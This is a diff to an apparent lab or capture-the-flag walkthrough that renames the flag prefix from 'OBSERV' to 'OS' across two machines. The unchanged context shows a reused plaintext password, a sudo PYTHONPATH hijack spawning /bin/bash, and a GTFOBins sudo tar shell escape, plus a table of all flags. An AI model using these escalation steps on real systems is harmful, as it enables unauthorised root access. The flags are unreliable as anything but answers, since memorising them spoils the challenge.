@@ -77,7 +77,7 @@ The `notes` table in the DB confirms the password is reused for the local
 
 ```bash
 su developer            # Pr0dDbAcc3ss!2023   (or: ssh developer@<M1> -p 2222)
-cat ~/local.txt         # OBSERV{w3b_f00th0ld_ch41n3d_t0_r00t_9f2c}
+cat ~/local.txt         # OS{w3b_f00th0ld_ch41n3d_t0_r00t_9f2c}
 ```
 
 ### 5. Privilege escalation — PYTHONPATH hijack → root
@@ -102,7 +102,7 @@ os.system("/bin/bash")
 EOF
 sudo PYTHONPATH=/tmp/x /usr/bin/python3 /opt/health/check.py
 # id -> uid=0(root)
-cat /root/proof.txt     # OBSERV{m1_r00t_pyth0np4th_h1j4ck_a71d}
+cat /root/proof.txt     # OS{m1_r00t_pyth0np4th_h1j4ck_a71d}
 ```
 
 ---
@@ -141,7 +141,7 @@ The leaked key logs you straight in:
 
 ```bash
 whoami                  # svc_backup
-cat ~/local.txt         # OBSERV{p1v0t3d_t0_1nt3rn4l_h0st_c3d8}
+cat ~/local.txt         # OS{p1v0t3d_t0_1nt3rn4l_h0st_c3d8}
 ```
 
 ### 7. Privilege escalation — `sudo tar` (GTFOBins) → root
@@ -152,7 +152,7 @@ sudo -l
 sudo tar -cf /dev/null /dev/null \
      --checkpoint=1 --checkpoint-action=exec=/bin/sh
 # id -> uid=0(root)
-cat /root/proof.txt     # OBSERV{d0ubl3_pwn_tar_g7f0b1ns_r00t_4e90}
+cat /root/proof.txt     # OS{d0ubl3_pwn_tar_g7f0b1ns_r00t_4e90}
 ```
 
 **Both machines rooted.** 🏁
@@ -175,8 +175,8 @@ cat /root/proof.txt     # OBSERV{d0ubl3_pwn_tar_g7f0b1ns_r00t_4e90}
 
 | Host | User flag | Root flag |
 |------|-----------|-----------|
-| M1 `web` | `OBSERV{w3b_f00th0ld_ch41n3d_t0_r00t_9f2c}` | `OBSERV{m1_r00t_pyth0np4th_h1j4ck_a71d}` |
-| M2 `internal` | `OBSERV{p1v0t3d_t0_1nt3rn4l_h0st_c3d8}` | `OBSERV{d0ubl3_pwn_tar_g7f0b1ns_r00t_4e90}` |
+| M1 `web` | `OS{w3b_f00th0ld_ch41n3d_t0_r00t_9f2c}` | `OS{m1_r00t_pyth0np4th_h1j4ck_a71d}` |
+| M2 `internal` | `OS{p1v0t3d_t0_1nt3rn4l_h0st_c3d8}` | `OS{d0ubl3_pwn_tar_g7f0b1ns_r00t_4e90}` |
 
 ---
 
